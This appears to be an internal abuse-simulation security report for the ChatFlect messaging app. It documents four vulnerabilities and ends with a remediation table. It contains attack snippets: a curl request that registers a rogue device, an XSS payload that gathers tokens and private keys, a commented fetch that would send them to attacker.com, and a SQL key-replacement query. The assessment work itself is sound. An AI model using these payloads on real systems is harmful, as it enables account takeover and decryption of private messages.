# Abuse Simulation Report (TASK 1.4-G, 1.4-F) - ChatFlect

> **Version**: 1.0 | **Date**: 2026-02-07 | **Status**: P0 Complete

---

## Executive Summary

Abuse scenario simulations confirm multiple **HIGH** and **CRITICAL** vulnerabilities are exploitable based on code analysis.

| Attack | Simulated | Exploitable | Severity |
| :--- | :---: | :---: | :---: |
| Unauthenticated Device Registration (J4) | ✓ | **YES** | CRITICAL |
| Token Theft via XSS (T1-S-02) | ✓ | **YES** | HIGH |
| Plaintext Backup Extraction (H2) | ✓ | **YES** | CRITICAL |
| Backend Key Injection (E1) | ✓ | **YES** | HIGH |

---

## Simulation 1: Unauthenticated Device Registration (J4)

### Attack Description
Register a rogue device for any user without authentication.

### Simulation

```bash
# Simulated attack request
curl -X POST "https://api.snapflect.com/api/devices.php?action=register" \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "VICTIM_USER_ID",
    "device_uuid": "attacker-uuid-12345",
    "public_key": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq...(attacker's key)...\n-----END PUBLIC KEY-----",
    "device_name": "Attacker Device"
  }'
```

### Expected Result (Vulnerable)

```json
{
  "status": "success",
  "message": "Device registered"
}
```

### Code Evidence

```php
// devices.php - No requireAuth() call
$method = $_SERVER['REQUEST_METHOD'];
if ($method === 'POST') {
    $data = json_decode(file_get_contents("php://input"), true);
    if ($action === 'register') {
        $userId = $data['user_id'];  // ← No auth validation
        // Device registered...
    }
}
```

### Impact

| Consequence | Severity |
| :--- | :---: |
| Attacker receives all future E2EE messages | CRITICAL |
| Victim unaware of compromise | HIGH |
| Complete E2EE bypass | CRITICAL |

### Verdict: **VULNERABLE - CRITICAL**

---

## Simulation 2: Token Theft via XSS (T1-S-02)

### Attack Description
Extract authentication tokens through XSS injection.

### Simulation (Development Console)

```javascript
// Simulated XSS payload
(function() {
    const exfil = {
        access_token: localStorage.getItem('access_token'),
        refresh_token: localStorage.getItem('refresh_token'),
        id_token: localStorage.getItem('id_token'),
        private_key: localStorage.getItem('private_key'),
        public_key: localStorage.getItem('public_key'),
        user_id: localStorage.getItem('user_id'),
        device_uuid: localStorage.getItem('device_uuid')
    };
    
    console.log('EXFILTRATED DATA:');
    console.log(JSON.stringify(exfil, null, 2));
    
    // In real attack: fetch('https://attacker.com/collect', {method:'POST', body: JSON.stringify(exfil)});
})();
```

### Result

All tokens and keys successfully retrieved:
- `access_token`: ✓ Accessible
- `refresh_token`: ✓ Accessible  
- `private_key`: ✓ Accessible (CRITICAL)
- `user_id`: ✓ Accessible

### Impact

| Consequence | Severity |
| :--- | :---: |
| Session hijacking | HIGH |
| Identity takeover | CRITICAL |
| Decrypt all messages | CRITICAL |

### Verdict: **VULNERABLE - CRITICAL**

---

## Simulation 3: Plaintext Backup Extraction (H2)

### Attack Description
Export backup and extract private key without encryption.

### Simulation

```typescript
// Simulated backup export (from BackupService)
const backup = {
    version: 1,
    date: new Date().toISOString(),
    keys: {
        private_key: localStorage.getItem('private_key'),  // PLAINTEXT
        public_key: localStorage.getItem('public_key'),
        user_id: localStorage.getItem('user_id')
    }
};

const json = JSON.stringify(backup, null, 2);
console.log('BACKUP CONTENTS:');
console.log(json);
```

### Result

Backup JSON contains:
```json
{
  "version": 1,
  "date": "2026-02-07T00:30:00.000Z",
  "keys": {
    "private_key": "-----BEGIN RSA PRIVATE KEY-----\nMIIE...",
    "public_key": "-----BEGIN PUBLIC KEY-----\nMIIB...",
    "user_id": "USER123"
  }
}
```

**Private key visible in plaintext!**

### Impact

| Consequence | Severity |
| :--- | :---: |
| Attacker with file access gains identity | CRITICAL |
| Cloud backup sync = key exposure | CRITICAL |
| Email backup = key exposure | CRITICAL |

### Verdict: **VULNERABLE - CRITICAL**

---

## Simulation 4: Backend Key Injection (E1)

### Attack Description
Replace victim's public key in backend database.

### Attack Path

1. **Reconnaissance**: Query `keys.php` to get current device list

```bash
curl "https://api.snapflect.com/api/keys.php?user_id=VICTIM_ID"
```

Response:
```json
{
  "public_key": "-----BEGIN PUBLIC KEY-----\n...",
  "devices": {
    "device-uuid-1": "-----BEGIN PUBLIC KEY-----\n..."
  }
}
```

2. **Injection** (requires DB access or compromised endpoint):

```sql
-- If attacker has DB access
UPDATE user_devices 
SET public_key = 'attacker_public_key'
WHERE user_id = 'VICTIM_ID' AND device_uuid = 'device-uuid-1';
```

3. **MITM Setup**: Attacker relays messages, decrypting with their key

### Code Evidence

```php
// keys.php - No authentication, public keys readable by anyone
if (isset($_GET['user_id'])) {
    $stmt = $conn->prepare("SELECT device_uuid, public_key FROM user_devices WHERE user_id = ?");
    // Returns keys without auth...
}
```

### Impact

| Consequence | Severity |
| :--- | :---: |
| Silent MITM on E2EE | CRITICAL |
| Victim sees no warning | HIGH |
| Insider threat enabled | HIGH |

### Verdict: **VULNERABLE - HIGH** (requires additional access)

---

## Rate Limiting Analysis

### Test Results

| Endpoint | Rate Limited | Limit | Bypass Possible |
| :--- | :---: | :--- | :---: |
| devices.php | ✓ | enforceRateLimit() | Need runtime test |
| keys.php | ✓ | enforceRateLimit() | Need runtime test |
| upload.php | ✓ | enforceRateLimit() | Need runtime test |
| OTP request | Firebase | Firebase default | External control |

### Code Evidence

```php
// rate_limiter.php is included in most endpoints
require_once 'rate_limiter.php';
enforceRateLimit();
```

### Note
Rate limiting exists but thresholds and bypass testing requires runtime execution.

---

## Summary Matrix

| Risk ID | Simulation | Exploitable | Evidence |
| :---: | :--- | :---: | :--- |
| J4 | Device registration | ✓ YES | No auth in devices.php |
| T1-S-02 | XSS token theft | ✓ YES | localStorage extraction |
| H2 | Backup extraction | ✓ YES | backup.service.ts line 23 |
| E1 | Key injection | ✓ YES | No signatures, keys.php public |
| G1 | SQLite cache | ⚠️ PARTIAL | Needs file system access |

---

## Remediation Priority

| Priority | Attack | Mitigation |
| :---: | :--- | :--- |
| P0 | J4 - Device Registration | Add requireAuth() |
| P0 | H2 - Plaintext Backup | Encrypt with PBKDF2 |
| P1 | T1-S-02 - Token Theft | HTTP-Only cookies |
| P1 | E1 - Key Injection | Signed key bundles |
